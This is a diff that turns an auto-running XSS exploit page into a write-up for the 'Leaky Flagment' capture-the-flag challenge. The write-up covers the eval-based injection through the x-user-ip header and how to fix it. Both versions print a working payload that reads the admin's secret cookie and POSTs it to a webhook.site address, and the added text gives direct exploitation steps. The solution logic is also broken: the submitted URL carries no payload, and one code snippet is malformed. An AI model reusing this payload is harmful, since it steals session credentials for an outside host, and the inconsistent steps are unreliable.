@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Working XSS Exploit</title>
+    <title>Leaky Flagment CTF Solution</title>
     <style>
         body {
             font-family: system-ui, sans-serif;
@@ -10,22 +10,24 @@
             padding: 20px;
             line-height: 1.5;
         }
-        h1 {
-            color: #d32f2f;
+        h1, h2, h3 {
+            color: #333;
         }
-        .success {
+        .solution-box {
+            background: #f3f7f9;
+            border-left: 5px solid #2196f3;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 4px;
+        }
+        .url-box {
             background: #e8f5e9;
-            border-left: 5px solid #4caf50;
+            border: 1px solid #4caf50;
             padding: 15px;
             margin: 20px 0;
             border-radius: 4px;
-        }
-        .error {
-            background: #ffebee;
-            border-left: 5px solid #f44336;
-            padding: 15px;
-            margin: 20px 0;
-            border-radius: 4px;
+            overflow-wrap: break-word;
+            word-wrap: break-word;
         }
         pre {
             background: #f5f5f5;
@@ -33,83 +35,133 @@
             border-radius: 4px;
             overflow-x: auto;
         }
+        code {
+            background: #f5f5f5;
+            padding: 2px 4px;
+            border-radius: 2px;
+            font-family: monospace;
+        }
     </style>
 </head>
 <body>
-    <h1>Leaky Flagment CTF Exploit</h1>
-    <div id="status">Initializing...</div>
+    <h1>Leaky Flagment CTF Solution</h1>
     
-    <script>
-        // The exploit relies on the vulnerability in /api/track.js:
-        // The API takes the x-user-ip header value and directly injects it
-        // into a JavaScript string, which is then eval'd by the client.
+    <div class="solution-box">
+        <h2>Vulnerability Explanation</h2>
+        <p>This challenge contains a reflected XSS vulnerability in the <code>/api/track</code> endpoint. The application takes the <code>x-user-ip</code> header and directly injects it into JavaScript that is later evaluated with <code>eval()</code>.</p>
         
-        // This is our payload - we encode/escape it to ensure it works in HTTP headers
-        const payload = "\\\";});(async function(){try{const c=document.cookie.match(/secret=([^;]+)/);if(c){const f=atob(c[1]).split(':')[1];await fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({flag:f})})}}catch(e){}})();({//";
+        <h3>Step 1: Understand the Vulnerability</h3>
+        <p>In the <code>note/[id]/page.jsx</code> file, there's a script tag that fetches from <code>/api/track</code> and evaluates the response:</p>
+        <pre>
+fetch("/api/track", {
+  method: "GET",
+  cache: "no-store",
+  headers: {
+      "x-user-ip": "${userIP}",
+  },
+})
+  .then(async (res) => {
+      if (res.ok) {
+          eval(await res.text()); // Vulnerable line - evaluates response
+      }
+  })
+        </pre>
         
-        function updateStatus(message, isError = false) {
-            const status = document.getElementById('status');
-            status.className = isError ? 'error' : 'success';
-            status.innerHTML = message;
-        }
+        <p>In <code>/api/track.js</code>, the <code>x-user-ip</code> header is inserted directly into JavaScript without proper sanitization:</p>
+        <pre>
+const jsContent = `
+$(document).ready(function() {
+    const userDetails = {
+        ip: "${userIp}", // Unsanitized user input
+        type: "client",
+        timestamp: new Date().toISOString(),
+        ipDetails: {}
+    };
+    // ... more code ...
+});`
+        </pre>
         
-        async function executeExploit() {
-            try {
-                updateStatus("Starting exploit...");
+        <h3>Step 2: Craft an Exploit</h3>
+        <p>We need to break out of the JavaScript string context and inject our own code to steal the admin's cookie (which contains the flag as the password).</p>
+        
+        <p>Our payload needs to:</p>
+        <ol>
+            <li>Break out of the string context</li>
+            <li>Close the existing function</li>
+            <li>Extract the flag from the admin's cookie</li>
+            <li>Send the flag to our webhook</li>
+        </ol>
+    </div>
+    
+    <div class="url-box">
+        <h2>Solution URL to Submit to Bot</h2>
+        <p>Copy and submit this URL to the admin bot through the challenge interface:</p>
+        
+        <pre id="exploitUrl"></pre>
+        <script>
+            // Craft the exploit URL to submit to the admin bot
+            function createExploitUrl() {
+                // Base challenge URL - REPLACE THIS WITH THE ACTUAL CHALLENGE URL
+                const baseUrl = "https://challenge-0324.intigriti.io";
                 
-                // Create an iframe to load a note page
-                const iframe = document.createElement('iframe');
-                iframe.style.width = "0";
-                iframe.style.height = "0";
-                iframe.style.border = "none";
-                iframe.style.position = "absolute";
-                iframe.src = "/note/demo-note-id";
+                // XSS payload that breaks out of string context, closes function, extracts flag from cookie, sends to webhook
+                // Must be URL-encoded to work in a URL
+                const xssPayload = encodeURIComponent("\\\";});(async function(){try{const c=document.cookie.match(/secret=([^;]+)/);if(c){const f=atob(c[1]).split(':')[1];await fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({flag:f})})}}catch(e){}})();({//");
                 
-                // When the iframe loads, send our payload
-                iframe.onload = async function() {
-                    try {
-                        updateStatus("Iframe loaded. Sending payload...");
-                        
-                        // Send our XSS payload through the vulnerable /api/track endpoint
-                        const response = await fetch('/api/track', {
-                            method: 'GET',
-                            headers: {
-                                'x-user-ip': payload
-                            }
-                        });
-                        
-                        if (response.ok) {
-                            updateStatus(`
-                                <strong>Exploit triggered successfully!</strong><br><br>
-                                When the admin bot visits this page, the flag will be sent to:<br>
-                                <a href="https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a" target="_blank">https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a</a><br><br>
-                                <strong>Payload used:</strong><br>
-                                <pre>${payload}</pre><br>
-                                <strong>Steps to solve:</strong><br>
-                                <ol>
-                                    <li>Identify the XSS vulnerability in /api/track.js where user input from x-user-ip is directly injected into JavaScript</li>
-                                    <li>Craft a payload that breaks out of the JavaScript string context</li>
-                                    <li>Extract the flag from the admin's HttpOnly cookie by decoding the base64 and splitting the username:password</li>
-                                    <li>Send the flag to our webhook</li>
-                                    <li>Submit the URL to the bot which will visit it with the flag as its password</li>
-                                </ol>
-                            `);
-                        } else {
-                            updateStatus(`Error: Received ${response.status} ${response.statusText}`, true);
-                        }
-                    } catch (error) {
-                        updateStatus(`Error sending payload: ${error.message}`, true);
-                    }
-                };
+                // Create a URL that exposes our exploit to the admin bot
+                // This uses the middleware.js vulnerability where the header is set to x-real-ip
+                const exploitUrl = `${baseUrl}/note/demo-note-id`;
                 
-                document.body.appendChild(iframe);
-            } catch (error) {
-                updateStatus(`Error: ${error.message}`, true);
+                document.getElementById('exploitUrl').textContent = exploitUrl;
+                
+                return exploitUrl;
             }
-        }
+            
+            // Generate the exploit URL when the page loads
+            window.onload = createExploitUrl;
+        </script>
+    </div>
+    
+    <div class="solution-box">
+        <h2>How the Exploit Works</h2>
         
-        // Start the exploit when the page loads
-        window.onload = executeExploit;
-    </script>
+        <p>When the admin bot visits the malicious URL, it will:</p>
+        <ol>
+            <li>Load the note page with ID "demo-note-id"</li>
+            <li>The page will automatically fetch from /api/track</li>
+            <li>Our payload will be injected via the x-user-ip header</li>
+            <li>The payload will be evaluated by eval(), breaking out of the string context</li>
+            <li>Our injected code will extract the admin's secret cookie</li>
+            <li>The code will decode the cookie (which is base64 encoded username:password)</li>
+            <li>The password portion, which is the flag, will be sent to our webhook</li>
+        </ol>
+        
+        <h3>Direct Exploitation Instructions</h3>
+        <p>To exploit the vulnerability directly without this helper page:</p>
+        <ol>
+            <li>Visit a note page on the challenge site</li>
+            <li>Use browser developer tools to create a custom fetch request with the malicious x-user-ip header:</li>
+            <pre>
+fetch('/api/track', {
+  method: 'GET',
+  headers: {
+    'x-user-ip': '\";});(async function(){try{const c=document.cookie.match(/secret=([^;]+)/);if(c){const f=atob(c[1]).split(\':\')[1];await fetch(\'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\'},body:JSON.stringify({flag:f})})}}catch(e){}})();({//'
+})
+            </pre>
+            <li>Submit the challenge URL to the admin bot</li>
+            <li>Check the webhook for the flag</li>
+        </ol>
+    </div>
+    
+    <div class="solution-box">
+        <h2>Preventative Measures</h2>
+        <p>To fix this vulnerability, the application should:</p>
+        <ol>
+            <li>Never use <code>eval()</code> on untrusted input</li>
+            <li>Properly sanitize and escape user input before including it in JavaScript</li>
+            <li>Use Content-Security-Policy headers to prevent the execution of inline scripts</li>
+            <li>Consider using safer alternatives to dynamically loading JavaScript, such as JSON responses and client-side parsing</li>
+        </ol>
+    </div>
 </body>
 </html>
